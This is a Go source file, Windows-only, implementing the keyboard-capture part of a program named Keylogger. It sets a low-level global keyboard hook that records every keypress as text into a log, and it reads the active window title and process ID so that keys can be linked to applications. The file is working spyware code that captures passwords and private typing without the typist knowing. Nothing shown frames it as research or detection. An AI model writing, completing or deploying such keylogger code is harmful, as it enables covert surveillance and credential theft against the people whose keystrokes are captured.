//go:build windows
// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	user32Keylog           = syscall.NewLazyDLL("user32.dll")
	setWindowsHookEx       = user32Keylog.NewProc("SetWindowsHookExW")
	callNextHookEx         = user32Keylog.NewProc("CallNextHookEx")
	unhookWindowsHookEx    = user32Keylog.NewProc("UnhookWindowsHookEx")
	getMessage             = user32Keylog.NewProc("GetMessageW")
	getForegroundWindow    = user32Keylog.NewProc("GetForegroundWindow")
	getWindowText          = user32Keylog.NewProc("GetWindowTextW")
	getWindowThreadProcessId = user32Keylog.NewProc("GetWindowThreadProcessId")
	getKeyState            = user32Keylog.NewProc("GetKeyState")
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	WM_SYSKEYDOWN  = 0x0104
)

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

type MSG struct {
	Hwnd    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

var (
	hookHandle uintptr
)

// startPlatformKeylogger starts the Windows keyboard hook
func (k *Keylogger) startPlatformKeylogger() error {
	logDebug("Starting Windows keyboard hook")

	// Set up the keyboard hook
	hook := syscall.NewCallback(func(nCode int, wParam uintptr, lParam uintptr) uintptr {
		if nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
			kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
			keyCode := int(kbdStruct.VkCode)
			
			// Check if shift is pressed
			shift := isKeyPressed(0x10) // VK_SHIFT
			
			// Convert key to string
			keyStr := ConvertKeyToString(keyCode, shift)
			
			// Add to log
			if k.running {
				k.addEntry(keyStr)
			}
		}

		ret, _, _ := callNextHookEx.Call(hookHandle, uintptr(nCode), wParam, lParam)
		return ret
	})

	ret, _, err := setWindowsHookEx.Call(
		WH_KEYBOARD_LL,
		hook,
		0,
		0,
	)

	if ret == 0 {
		return fmt.Errorf("failed to set keyboard hook: %v", err)
	}

	hookHandle = ret

	// Message loop
	var msg MSG
	for k.running {
		ret, _, _ := getMessage.Call(
			uintptr(unsafe.Pointer(&msg)),
			0,
			0,
			0,
		)

		if ret == 0 {
			break
		}

		select {
		case <-k.stopChan:
			unhookWindowsHookEx.Call(hookHandle)
			return nil
		default:
		}
	}

	unhookWindowsHookEx.Call(hookHandle)
	return nil
}

// getActiveWindowInfo returns the title and process name of the active window
func getActiveWindowInfo() (string, string) {
	hwnd, _, _ := getForegroundWindow.Call()
	if hwnd == 0 {
		return "Unknown", "Unknown"
	}

	// Get window title
	titleBuf := make([]uint16, 256)
	getWindowText.Call(
		hwnd,
		uintptr(unsafe.Pointer(&titleBuf[0])),
		uintptr(len(titleBuf)),
	)
	title := syscall.UTF16ToString(titleBuf)

	// Get process ID
	var processID uint32
	getWindowThreadProcessId.Call(
		hwnd,
		uintptr(unsafe.Pointer(&processID)),
	)

	// Get process name (simplified - just use PID for now)
	processName := fmt.Sprintf("PID_%d", processID)

	if title == "" {
		title = "Unknown Window"
	}

	return title, processName
}

// isKeyPressed checks if a key is currently pressed
func isKeyPressed(vkCode int) bool {
	ret, _, _ := getKeyState.Call(uintptr(vkCode))
	return (ret & 0x8000) != 0
}
